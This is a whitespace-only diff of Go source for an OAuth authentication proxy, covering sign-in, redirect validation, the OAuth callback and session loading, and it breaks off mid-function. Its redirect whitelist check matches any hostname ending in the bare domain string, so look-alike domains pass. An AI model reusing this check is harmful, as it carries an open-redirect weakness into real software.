// ManualSignIn handles basic auth logins to the proxy\n func (p *OAuthProxy) ManualSignIn(rw http.ResponseWriter, req *http.Request) (string, bool) {\n-\tif req.Method != \"POST\" || p.HtpasswdFile == nil {\n-\t\treturn \"\", false\n-\t}\n-\tuser := req.FormValue(\"username\")\n-\tpasswd := req.FormValue(\"password\")\n-\tif user == \"\" {\n-\t\treturn \"\", false\n-\t}\n-\t// check auth\n-\tif p.HtpasswdFile.Validate(user, passwd) {\n-\t\tlogger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n-\t\treturn user, true\n-\t}\n-\tlogger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n-\treturn \"\", false\n+        if req.Method != \"POST\" || p.HtpasswdFile == nil {\n+                return \"\", false\n+        }\n+        user := req.FormValue(\"username\")\n+        passwd := req.FormValue(\"password\")\n+        if user == \"\" {\n+                return \"\", false\n+        }\n+        // check auth\n+        if p.HtpasswdFile.Validate(user, passwd) {\n+                logger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n+                return user, true\n+        }\n+        logger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n+        return \"\", false\n }\n \n // GetRedirect reads the query parameter to get the URL to redirect clients to\n // once authenticated with the OAuthProxy\n func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error) {\n-\terr = req.ParseForm()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tredirect = req.Header.Get(\"X-Auth-Request-Redirect\")\n-\tif req.Form.Get(\"rd\") != \"\" {\n-\t\tredirect = req.Form.Get(\"rd\")\n-\t}\n-\tif !p.IsValidRedirect(redirect) {\n-\t\tredirect = req.URL.Path\n-\t\tif strings.HasPrefix(redirect, p.ProxyPrefix) {\n-\t\t\tredirect = \"/\"\n-\t\t}\n-\t}\n-\n-\treturn\n+        err = req.ParseForm()\n+        if err != nil {\n+                return\n+        }\n+\n+        redirect = req.Header.Get(\"X-Auth-Request-Redirect\")\n+        if req.Form.Get(\"rd\") != \"\" {\n+                redirect = req.Form.Get(\"rd\")\n+        }\n+        if !p.IsValidRedirect(redirect) {\n+                redirect = req.URL.Path\n+                if strings.HasPrefix(redirect, p.ProxyPrefix) {\n+                        redirect = \"/\"\n+                }\n+        }\n+\n+        return\n }\n \n // splitHostPort separates host and port. If the port is not valid, it returns\n@@ -565,325 +565,325 @@ func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error)\n // Unlike net.SplitHostPort, but per RFC 3986, it requires ports to be numeric.\n // *** taken from net/url, modified validOptionalPort() to accept \":*\"\n func splitHostPort(hostport string) (host, port string) {\n-\thost = hostport\n+        host = hostport\n \n-\tcolon := strings.LastIndexByte(host, ':')\n-\tif colon != -1 && validOptionalPort(host[colon:]) {\n-\t\thost, port = host[:colon], host[colon+1:]\n-\t}\n+        colon := strings.LastIndexByte(host, ':')\n+        if colon != -1 && validOptionalPort(host[colon:]) {\n+                host, port = host[:colon], host[colon+1:]\n+        }\n \n-\tif strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n-\t\thost = host[1 : len(host)-1]\n-\t}\n+        if strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n+                host = host[1 : len(host)-1]\n+        }\n \n-\treturn\n+        return\n }\n \n // validOptionalPort reports whether port is either an empty string\n // or matches /^:\\d*$/\n // *** taken from net/url, modified to accept \":*\"\n func validOptionalPort(port string) bool {\n-\tif port == \"\" || port == \":*\" {\n-\t\treturn true\n-\t}\n-\tif port[0] != ':' {\n-\t\treturn false\n-\t}\n-\tfor _, b := range port[1:] {\n-\t\tif b < '0' || b > '9' {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\treturn true\n+        if port == \"\" || port == \":*\" {\n+                return true\n+        }\n+        if port[0] != ':' {\n+                return false\n+        }\n+        for _, b := range port[1:] {\n+                if b < '0' || b > '9' {\n+                        return false\n+                }\n+        }\n+        return true\n }\n \n // IsValidRedirect checks whether the redirect URL is whitelisted\n func (p *OAuthProxy) IsValidRedirect(redirect string) bool {\n-\tswitch {\n-\tcase redirect == \"\":\n-\t\t// The user didn't specify a redirect, should fallback to `/`\n-\t\treturn false\n-\tcase strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !invalidRedirectRegex.MatchString(redirect):\n-\t\treturn true\n-\tcase strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n-\t\tredirectURL, err := url.Parse(redirect)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n-\t\t\treturn false\n-\t\t}\n-\t\tredirectHostname := redirectURL.Hostname()\n-\n-\t\tfor _, domain := range p.whitelistDomains {\n-\t\t\tdomainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n-\t\t\tif domainHostname == \"\" {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\n-\t\t\tif (redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) {\n-\t\t\t\t// the domain names match, now validate the ports\n-\t\t\t\t// if the whitelisted domain's port is '*', allow all ports\n-\t\t\t\t// if the whitelisted domain contains a specific port, only allow that port\n-\t\t\t\t// if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n-\t\t\t\tredirectPort := redirectURL.Port()\n-\t\t\t\tif (domainPort == \"*\") ||\n-\t\t\t\t\t(domainPort == redirectPort) ||\n-\t\t\t\t\t(domainPort == \"\" && redirectPort == \"\") {\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n-\t\treturn false\n-\tdefault:\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n-\t\treturn false\n-\t}\n+        switch {\n+        case redirect == \"\":\n+                // The user didn't specify a redirect, should fallback to `/`\n+                return false\n+        case strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !invalidRedirectRegex.MatchString(redirect):\n+                return true\n+        case strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n+                redirectURL, err := url.Parse(redirect)\n+                if err != nil {\n+                        logger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n+                        return false\n+                }\n+                redirectHostname := redirectURL.Hostname()\n+\n+                for _, domain := range p.whitelistDomains {\n+                        domainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n+                        if domainHostname == \"\" {\n+                                continue\n+                        }\n+\n+                        if (redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) {\n+                                // the domain names match, now validate the ports\n+                                // if the whitelisted domain's port is '*', allow all ports\n+                                // if the whitelisted domain contains a specific port, only allow that port\n+                                // if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n+                                redirectPort := redirectURL.Port()\n+                                if (domainPort == \"*\") ||\n+                                        (domainPort == redirectPort) ||\n+                                        (domainPort == \"\" && redirectPort == \"\") {\n+                                        return true\n+                                }\n+                        }\n+                }\n+\n+                logger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n+                return false\n+        default:\n+                logger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n+                return false\n+        }\n }\n \n // IsWhitelistedRequest is used to check if auth should be skipped for this request\n func (p *OAuthProxy) IsWhitelistedRequest(req *http.Request) bool {\n-\tisPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n-\treturn isPreflightRequestAllowed || p.IsWhitelistedPath(req.URL.Path)\n+        isPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n+        return isPreflightRequestAllowed || p.IsWhitelistedPath(req.URL.Path)\n }\n \n // IsWhitelistedPath is used to check if the request path is allowed without auth\n func (p *OAuthProxy) IsWhitelistedPath(path string) bool {\n-\tfor _, u := range p.compiledRegex {\n-\t\tif u.MatchString(path) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, u := range p.compiledRegex {\n+                if u.MatchString(path) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // See https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=en\n var noCacheHeaders = map[string]string{\n-\t\"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n-\t\"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n-\t\"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n+        \"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n+        \"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n+        \"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n }\n \n // prepareNoCache prepares headers for preventing browser caching.\n func prepareNoCache(w http.ResponseWriter) {\n-\t// Set NoCache headers\n-\tfor k, v := range noCacheHeaders {\n-\t\tw.Header().Set(k, v)\n-\t}\n+        // Set NoCache headers\n+        for k, v := range noCacheHeaders {\n+                w.Header().Set(k, v)\n+        }\n }\n \n func (p *OAuthProxy) ServeHTTP(rw http.ResponseWriter, req *http.Request) {\n-\tif strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n-\t\tprepareNoCache(rw)\n-\t}\n-\n-\tswitch path := req.URL.Path; {\n-\tcase path == p.RobotsPath:\n-\t\tp.RobotsTxt(rw)\n-\tcase p.IsWhitelistedRequest(req):\n-\t\tp.serveMux.ServeHTTP(rw, req)\n-\tcase path == p.SignInPath:\n-\t\tp.SignIn(rw, req)\n-\tcase path == p.SignOutPath:\n-\t\tp.SignOut(rw, req)\n-\tcase path == p.OAuthStartPath:\n-\t\tp.OAuthStart(rw, req)\n-\tcase path == p.OAuthCallbackPath:\n-\t\tp.OAuthCallback(rw, req)\n-\tcase path == p.AuthOnlyPath:\n-\t\tp.AuthenticateOnly(rw, req)\n-\tcase path == p.UserInfoPath:\n-\t\tp.UserInfo(rw, req)\n-\tdefault:\n-\t\tp.Proxy(rw, req)\n-\t}\n+        if strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n+                prepareNoCache(rw)\n+        }\n+\n+        switch path := req.URL.Path; {\n+        case path == p.RobotsPath:\n+                p.RobotsTxt(rw)\n+        case p.IsWhitelistedRequest(req):\n+                p.serveMux.ServeHTTP(rw, req)\n+        case path == p.SignInPath:\n+                p.SignIn(rw, req)\n+        case path == p.SignOutPath:\n+                p.SignOut(rw, req)\n+        case path == p.OAuthStartPath:\n+                p.OAuthStart(rw, req)\n+        case path == p.OAuthCallbackPath:\n+                p.OAuthCallback(rw, req)\n+        case path == p.AuthOnlyPath:\n+                p.AuthenticateOnly(rw, req)\n+        case path == p.UserInfoPath:\n+                p.UserInfo(rw, req)\n+        default:\n+                p.Proxy(rw, req)\n+        }\n }\n \n // SignIn serves a page prompting users to sign in\n func (p *OAuthProxy) SignIn(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tuser, ok := p.ManualSignIn(rw, req)\n-\tif ok {\n-\t\tsession := &sessionsapi.SessionState{User: user}\n-\t\tp.SaveSession(rw, req, session)\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusOK)\n-\t\t}\n-\t}\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+\n+        user, ok := p.ManualSignIn(rw, req)\n+        if ok {\n+                session := &sessionsapi.SessionState{User: user}\n+                p.SaveSession(rw, req, session)\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusOK)\n+                }\n+        }\n }\n \n //UserInfo endpoint outputs session email and preferred username in JSON format\n func (p *OAuthProxy) UserInfo(rw http.ResponseWriter, req *http.Request) {\n \n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\tuserInfo := struct {\n-\t\tEmail             string `json:\"email\"`\n-\t\tPreferredUsername string `json:\"preferredUsername,omitempty\"`\n-\t}{\n-\t\tEmail:             session.Email,\n-\t\tPreferredUsername: session.PreferredUsername,\n-\t}\n-\trw.Header().Set(\"Content-Type\", \"application/json\")\n-\trw.WriteHeader(http.StatusOK)\n-\tjson.NewEncoder(rw).Encode(userInfo)\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n+                return\n+        }\n+        userInfo := struct {\n+                Email             string `json:\"email\"`\n+                PreferredUsername string `json:\"preferredUsername,omitempty\"`\n+        }{\n+                Email:             session.Email,\n+                PreferredUsername: session.PreferredUsername,\n+        }\n+        rw.Header().Set(\"Content-Type\", \"application/json\")\n+        rw.WriteHeader(http.StatusOK)\n+        json.NewEncoder(rw).Encode(userInfo)\n }\n \n // SignOut sends a response to clear the authentication cookie\n func (p *OAuthProxy) SignOut(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tp.ClearSessionCookie(rw, req)\n-\thttp.Redirect(rw, req, redirect, http.StatusFound)\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        p.ClearSessionCookie(rw, req)\n+        http.Redirect(rw, req, redirect, http.StatusFound)\n }\n \n // OAuthStart starts the OAuth2 authentication flow\n func (p *OAuthProxy) OAuthStart(rw http.ResponseWriter, req *http.Request) {\n-\tprepareNoCache(rw)\n-\tnonce, err := encryption.Nonce()\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining nonce: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tp.SetCSRFCookie(rw, req, nonce)\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tredirectURI := p.GetRedirectURI(req.Host)\n-\thttp.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n+        prepareNoCache(rw)\n+        nonce, err := encryption.Nonce()\n+        if err != nil {\n+                logger.Printf(\"Error obtaining nonce: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        p.SetCSRFCookie(rw, req, nonce)\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        redirectURI := p.GetRedirectURI(req.Host)\n+        http.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n }\n \n // OAuthCallback is the OAuth2 authentication flow callback that finishes the\n // OAuth2 authentication flow\n func (p *OAuthProxy) OAuthCallback(rw http.ResponseWriter, req *http.Request) {\n-\tremoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n-\n-\t// finish the oauth cycle\n-\terr := req.ParseForm()\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 callback: %s\" + err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\terrorString := req.Form.Get(\"error\")\n-\tif errorString != \"\" {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 callback: %s \", errorString)\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", errorString)\n-\t\treturn\n-\t}\n-\n-\tsession, err := p.redeemCode(req.Context(), req.Host, req.Form.Get(\"code\"))\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error redeeming code during OAuth2 callback: %s \", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n-\t\treturn\n-\t}\n-\n-\ts := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n-\tif len(s) != 2 {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 state: invalid length\")\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Invalid State\")\n-\t\treturn\n-\t}\n-\tnonce := s[0]\n-\tredirect := s[1]\n-\tc, err := req.Cookie(p.CSRFCookieName)\n-\tif err != nil {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable too obtain CSRF cookie\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", err.Error())\n-\t\treturn\n-\t}\n-\tp.ClearCSRFCookie(rw, req)\n-\tif c.Value != nonce {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: csrf token mismatch, potential attack\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", \"csrf failed\")\n-\t\treturn\n-\t}\n-\n-\tif !p.IsValidRedirect(redirect) {\n-\t\tredirect = \"/\"\n-\t}\n-\n-\t// set cookie, or deny\n-\tif p.Validator(session.Email) && p.provider.ValidateGroup(session.Email) {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n-\t\terr := p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"%s %s\", remoteAddr, err)\n-\t\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n-\t\t\treturn\n-\t\t}\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", \"Invalid Account\")\n-\t}\n+        remoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n+\n+        // finish the oauth cycle\n+        err := req.ParseForm()\n+        if err != nil {\n+                logger.Printf(\"Error while parsing OAuth2 callback: %s\" + err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        errorString := req.Form.Get(\"error\")\n+        if errorString != \"\" {\n+                logger.Printf(\"Error while parsing OAuth2 callback: %s \", errorString)\n+                p.ErrorPage(rw, 403, \"Permission Denied\", errorString)\n+                return\n+        }\n+\n+        session, err := p.redeemCode(req.Context(), req.Host, req.Form.Get(\"code\"))\n+        if err != nil {\n+                logger.Printf(\"Error redeeming code during OAuth2 callback: %s \", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n+                return\n+        }\n+\n+        s := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n+        if len(s) != 2 {\n+                logger.Printf(\"Error while parsing OAuth2 state: invalid length\")\n+                p.ErrorPage(rw, 500, \"Internal Error\", \"Invalid State\")\n+                return\n+        }\n+        nonce := s[0]\n+        redirect := s[1]\n+        c, err := req.Cookie(p.CSRFCookieName)\n+        if err != nil {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable too obtain CSRF cookie\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", err.Error())\n+                return\n+        }\n+        p.ClearCSRFCookie(rw, req)\n+        if c.Value != nonce {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: csrf token mismatch, potential attack\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", \"csrf failed\")\n+                return\n+        }\n+\n+        if !p.IsValidRedirect(redirect) {\n+                redirect = \"/\"\n+        }\n+\n+        // set cookie, or deny\n+        if p.Validator(session.Email) && p.provider.ValidateGroup(session.Email) {\n+                logger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n+                err := p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.Printf(\"%s %s\", remoteAddr, err)\n+                        p.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n+                        return\n+                }\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", \"Invalid Account\")\n+        }\n }\n \n // AuthenticateOnly checks whether the user is currently logged in\n func (p *OAuthProxy) AuthenticateOnly(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, \"unauthorized request\", http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\t// we are authenticated\n-\tp.addHeadersForProxying(rw, req, session)\n-\trw.WriteHeader(http.StatusAccepted)\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, \"unauthorized request\", http.StatusUnauthorized)\n+                return\n+        }\n+\n+        // we are authenticated\n+        p.addHeadersForProxying(rw, req, session)\n+        rw.WriteHeader(http.StatusAccepted)\n }\n \n // Proxy proxies the user request if the user is authenticated else it prompts\n // them to authenticate\n func (p *OAuthProxy) Proxy(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tswitch err {\n-\tcase nil:\n-\t\t// we are authenticated\n-\t\tp.addHeadersForProxying(rw, req, session)\n-\t\tp.serveMux.ServeHTTP(rw, req)\n-\n-\tcase ErrNeedsLogin:\n-\t\t// we need to send the user to a login screen\n-\t\tif isAjax(req) {\n-\t\t\t// no point redirecting an AJAX request\n-\t\t\tp.ErrorJSON(rw, http.StatusUnauthorized)\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusForbidden)\n-\t\t}\n-\n-\tdefault:\n-\t\t// unknown error\n-\t\tlogger.Printf(\"Unexpected internal error: %s\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError,\n-\t\t\t\"Internal Error\", \"Internal Error\")\n-\t}\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        switch err {\n+        case nil:\n+                // we are authenticated\n+                p.addHeadersForProxying(rw, req, session)\n+                p.serveMux.ServeHTTP(rw, req)\n+\n+        case ErrNeedsLogin:\n+                // we need to send the user to a login screen\n+                if isAjax(req) {\n+                        // no point redirecting an AJAX request\n+                        p.ErrorJSON(rw, http.StatusUnauthorized)\n+                        return\n+                }\n+\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusForbidden)\n+                }\n+\n+        default:\n+                // unknown error\n+                logger.Printf(\"Unexpected internal error: %s\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError,\n+                        \"Internal Error\", \"Internal Error\")\n+        }\n \n }\n \n@@ -891,315 +891,315 @@ func (p *OAuthProxy) Proxy(rw http.ResponseWriter, req *http.Request) {\n // Returns nil, ErrNeedsLogin if user needs to login.\n // Set-Cookie headers may be set on the response as a side-effect of calling this method.\n func (p *OAuthProxy) getAuthenticatedSession(rw http.ResponseWriter, req *http.Request) (*sessionsapi.SessionState, error) {\n-\tvar session *sessionsapi.SessionState\n-\tvar err error\n-\tvar saveSession, clearSession, revalidated bool\n-\n-\tif p.skipJwtBearerTokens && req.Header.Get(\"Authorization\") != \"\" {\n-\t\tsession, err = p.GetJwtSession(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error retrieving session from token in Authorization header: %s\", err)\n-\t\t}\n-\t\tif session != nil {\n-\t\t\tsaveSession = false\n-\t\t}\n-\t}\n-\n-\tremoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n-\tif session == nil {\n-\t\tsession, err = p.LoadCookiedSession(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error loading cookied session: %s\", err)\n-\t\t}\n-\n-\t\tif session != nil {\n-\t\t\tif session.Age() > p.CookieRefresh && p.CookieRefresh != time.Duration(0) {\n-\t\t\t\tlogger.Printf(\"Refreshing %s old session cookie for %s (refresh after %s)\", session.Age(), session, p.CookieRefresh)\n-\t\t\t\tsaveSession = true\n-\t\t\t}\n-\n-\t\t\tif ok, err := p.provider.RefreshSessionIfNeeded(req.Context(), session); err != nil {\n-\t\t\t\tlogger.Printf(\"%s removing session. error refreshing access token %s %s\", remoteAddr, err, session)\n-\t\t\t\tclearSession = true\n-\t\t\t\tsession = nil\n-\t\t\t} else if ok {\n-\t\t\t\tsaveSession = true\n-\t\t\t\trevalidated = true\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif session != nil && session.IsExpired() {\n-\t\tlogger.Printf(\"Removing session: token expired %s\", session)\n-\t\tsession = nil\n-\t\tsaveSession = false\n-\t\tclearSession = true\n-\t}\n-\n-\tif saveSession && !revalidated && session != nil && session.AccessToken != \"\" {\n-\t\tif !p.provider.ValidateSessionState(req.Context(), session) {\n-\t\t\tlogger.Printf(\"Removing session: error validating %s\", session)\n-\t\t\tsaveSession = false\n-\t\t\tsession = nil\n-\t\t\tclearSession = true\n-\t\t}\n-\t}\n-\n-\tif session != nil && session.Email != \"\" && !p.Validator(session.Email) {\n-\t\tlogger.Printf(session.Email, req, logger.AuthFailure, \"Invalid authentication via session: removing session %s\", session)\n-\t\tsession = nil\n-\t\tsaveSession = false\n-\t\tclearSession = true\n-\t}\n-\n-\tif saveSession && session != nil {\n-\t\terr = p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.PrintAuthf(session.Email, req, logger.AuthError, \"Save session error %s\", err)\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\tif clearSession {\n-\t\tp.ClearSessionCookie(rw, req)\n-\t}\n-\n-\tif session == nil {\n-\t\tsession, err = p.CheckBasicAuth(req)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Error during basic auth validation: %s\", err)\n-\t\t}\n-\t}\n-\n-\tif session == nil {\n-\t\treturn nil, ErrNeedsLogin\n-\t}\n-\n-\treturn session, nil\n+        var session *sessionsapi.SessionState\n+        var err error\n+        var saveSession, clearSession, revalidated bool\n+\n+        if p.skipJwtBearerTokens && req.Header.Get(\"Authorization\") != \"\" {\n+                session, err = p.GetJwtSession(req)\n+                if err != nil {\n+                        logger.Printf(\"Error retrieving session from token in Authorization header: %s\", err)\n+                }\n+                if session != nil {\n+                        saveSession = false\n+                }\n+        }\n+\n+        remoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n+        if session == nil {\n+                session, err = p.LoadCookiedSession(req)\n+                if err != nil {\n+                        logger.Printf(\"Error loading cookied session: %s\", err)\n+                }\n+\n+                if session != nil {\n+                        if session.Age() > p.CookieRefresh && p.CookieRefresh != time.Duration(0) {\n+                                logger.Printf(\"Refreshing %s old session cookie for %s (refresh after %s)\", session.Age(), session, p.CookieRefresh)\n+                                saveSession = true\n+                        }\n+\n+                        if ok, err := p.provider.RefreshSessionIfNeeded(req.Context(), session); err != nil {\n+                                logger.Printf(\"%s removing session. error refreshing access token %s %s\", remoteAddr, err, session)\n+                                clearSession = true\n+                                session = nil\n+                        } else if ok {\n+                                saveSession = true\n+                                revalidated = true\n+                        }\n+                }\n+        }\n+\n+        if session != nil && session.IsExpired() {\n+                logger.Printf(\"Removing session: token expired %s\", session)\n+                session = nil\n+                saveSession = false\n+                clearSession = true\n+        }\n+\n+        if saveSession && !revalidated && session != nil && session.AccessToken != \"\" {\n+                if !p.provider.ValidateSessionState(req.Context(), session) {\n+                        logger.Printf(\"Removing session: error validating %s\", session)\n+                        saveSession = false\n+                        session = nil\n+                        clearSession = true\n+                }\n+        }\n+\n+        if session != nil && session.Email != \"\" && !p.Validator(session.Email) {\n+                logger.Printf(session.Email, req, logger.AuthFailure, \"Invalid authentication via session: removing session %s\", session)\n+                session = nil\n+                saveSession = false\n+                clearSession = true\n+        }\n+\n+        if saveSession && session != nil {\n+                err = p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.PrintAuthf(session.Email, req, logger.AuthError, \"Save session error %s\", err)\n+                        return nil, err\n+                }\n+        }\n+\n+        if clearSession {\n+                p.ClearSessionCookie(rw, req)\n+        }\n+\n+        if session == nil {\n+                session, err = p.CheckBasicAuth(req)\n+                if err != nil {\n+                        logger.Printf(\"Error during basic auth validation: %s\", err)\n+                }\n+        }\n+\n+        if session == nil {\n+                return nil, 